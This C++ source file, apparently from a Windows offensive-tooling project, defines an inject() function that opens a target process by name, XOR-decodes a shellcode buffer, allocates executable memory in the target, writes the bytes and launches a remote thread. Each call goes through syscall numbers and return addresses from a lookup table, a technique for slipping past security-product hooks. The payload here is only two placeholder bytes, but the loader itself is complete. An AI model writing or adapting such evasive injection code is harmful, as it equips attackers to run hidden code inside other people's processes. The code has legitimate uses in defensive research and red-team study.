#include "pch.h"
#include "headers.h"
#include "types.h"
#include "dll_headers.h"
#include "reconnaissance.h"
#include "syscalls.h"


int inject(WCHAR* procname)
{

    BYTE shellcode[] = { 0x90, 0x90 };

    int status = 0;

    int target_pid = ret_pid_by_proc_name(procname);

    HANDLE proc_h = 0;
    CLIENT_ID client_id = { (HANDLE)target_pid, 0 };

    OBJECT_ATTRIBUTES obj_attr = { 0 };
    obj_attr.Length = sizeof OBJECT_ATTRIBUTES;

    UINT64 desired_access = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE;

    status = ZwOpenProcess(
        &proc_h, 
        desired_access, 
        &obj_attr, 
        client_id, 
        g_zw_functions[ZwOpenProcessF].SSN, 
        g_zw_functions[ZwOpenProcessF].sysretAddr
    );
    if (status != STATUS_SUCCESS)
        return -1;

    SIZE_T shellcode_size = sizeof(shellcode);
    SIZE_T allocated_shellcode_size = 0;
    allocated_shellcode_size = sizeof(shellcode);
    BYTE* local_addr = 0;
    status = ZwAllocateVirtualMemory(
        ((HANDLE)(LONG_PTR)-1), 
        (PVOID*)&local_addr, 
        0, 
        &allocated_shellcode_size, 
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
        g_zw_functions[ZwAllocateVirtualMemoryF].SSN,
		g_zw_functions[ZwAllocateVirtualMemoryF].sysretAddr
    );
    if (status != STATUS_SUCCESS || local_addr == 0)
        return -1;

    for (int i = 0; i < shellcode_size; i++)
        local_addr[i] = shellcode[i] ^ 0x53;


    PVOID remote_addr = 0;

    allocated_shellcode_size = sizeof(shellcode);
    status = ZwAllocateVirtualMemory(
        proc_h, 
        &remote_addr, 
        0, 
        &allocated_shellcode_size, 
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
        g_zw_functions[ZwAllocateVirtualMemoryF].SSN,
		g_zw_functions[ZwAllocateVirtualMemoryF].sysretAddr
    );
    if (status != STATUS_SUCCESS || remote_addr == 0)
        return -1;

    SIZE_T bytestowritten;
    status = ZwWriteVirtualMemory(
        proc_h, 
        remote_addr, 
        local_addr, 
        shellcode_size, 
        &bytestowritten,
        g_zw_functions[ZwWriteVirtualMemoryF].SSN,
		g_zw_functions[ZwWriteVirtualMemoryF].sysretAddr
    );
    if (status != STATUS_SUCCESS || bytestowritten != shellcode_size)
        return -1;

    HANDLE thread_handle = 0;
    status = ZwCreateThreadEx(
        &thread_handle, 
        THREAD_ALL_ACCESS, NULL, 
        proc_h, 
        (PUSER_THREAD_START_ROUTINE)remote_addr, NULL, 0, 0, 0, 0, NULL,
        g_zw_functions[ZwCreateThreadExF].SSN,
		g_zw_functions[ZwCreateThreadExF].sysretAddr
    );
    if (status != STATUS_SUCCESS)
        return -1;
            
    return ST_SUCCESS;
}